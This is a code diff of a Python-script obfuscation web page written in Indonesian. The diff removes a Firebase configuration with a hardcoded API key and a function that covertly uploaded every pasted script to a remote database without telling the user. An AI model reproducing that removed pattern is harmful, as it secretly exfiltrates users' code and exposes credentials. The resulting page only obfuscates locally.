@@ -3,36 +3,10 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>ENC PYTHON <= - Enkripsi Modern</title>
-    <!-- Firebase (opsional) -->
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script>
-      // Konfigurasi Firebase (ubah sesuai kebutuhan Anda)
-      var firebaseConfig = {
-        apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
-        authDomain: "login-24767.firebaseapp.com",
-        databaseURL: "https://login-24767-default-rtdb.firebaseio.com",
-        projectId: "login-24767",
-        storageBucket: "login-24767.appspot.com",
-        messagingSenderId: "809521846306",
-        appId: "1:809521846306:web:ee8bc0fe4e07584bad127b"
-      };
-      firebase.initializeApp(firebaseConfig);
-      var database = firebase.database();
-      function sendToFirebase(identifier, code) {
-        var refPath = 'EncPython/' + identifier;
-        firebase.database().ref(refPath).set({
-          code: code,
-          timestamp: Date.now()
-        });
-      }
-    </script>
-
+    <title>C PYTHON <= - Enkripsi Modern</title>
     <!-- Sertakan PyScript (gunakan versi rilis tertentu untuk stabilitas) -->
     <link rel="stylesheet" href="https://pyscript.net/releases/2022.12.1/pyscript.css" />
     <script defer src="https://pyscript.net/releases/2022.12.1/pyscript.js"></script>
-
     <style>
       /* Animasi latar belakang gradient */
       body {
@@ -168,7 +142,7 @@
       <div class="spinner" id="spinner"></div>
       <h2>C PYTHON <=</h2>
       <textarea id="codeInput" placeholder="Tempel script Python di sini..."></textarea>
-      <button id="encryptButton">ENC GAS</button>
+      <button id="encryptButton" disabled>ENC GAS</button>
       <div class="result-section">
         <h3>HASIL ENCRIPT DI TAMPILKAN DI BAWAH INI</h3>
         <div id="output"></div>
@@ -176,13 +150,15 @@
       </div>
     </div>
 
-    <!-- PyScript: Kode Python Modular dengan Animasi dan UI Keren -->
+    <!-- PyScript: Kode Python untuk enkripsi dan obfuscation -->
     <py-script>
 import asyncio
 import uuid
 import js
 
 async def main():
+    # Nonaktifkan tombol ENCRYPT sampai pustaka siap
+    js.document.getElementById("encryptButton").disabled = True
     import micropip
     await micropip.install("pyaes")
     import pyaes
@@ -212,20 +188,19 @@ async def main():
         return header + encrypted_hex
 
     def on_encrypt(event):
-        # Tampilkan spinner selama proses enkripsi
         js.document.getElementById("spinner").style.display = "block"
         code = js.document.getElementById("codeInput").value
         if not code.strip():
             js.document.getElementById("output").innerText = "Input kosong!"
             js.document.getElementById("spinner").style.display = "none"
             return
-        identifier = str(uuid.uuid4())
-        js.sendToFirebase(identifier, code)
+        # Hasil enkripsi
         obfuscated = obfuscate_code(code)
         js.document.getElementById("output").innerText = obfuscated
         js.document.getElementById("spinner").style.display = "none"
 
     js.document.getElementById("encryptButton").addEventListener("click", on_encrypt)
+    js.document.getElementById("encryptButton").disabled = False
 
 asyncio.ensure_future(main())
     </py-script>
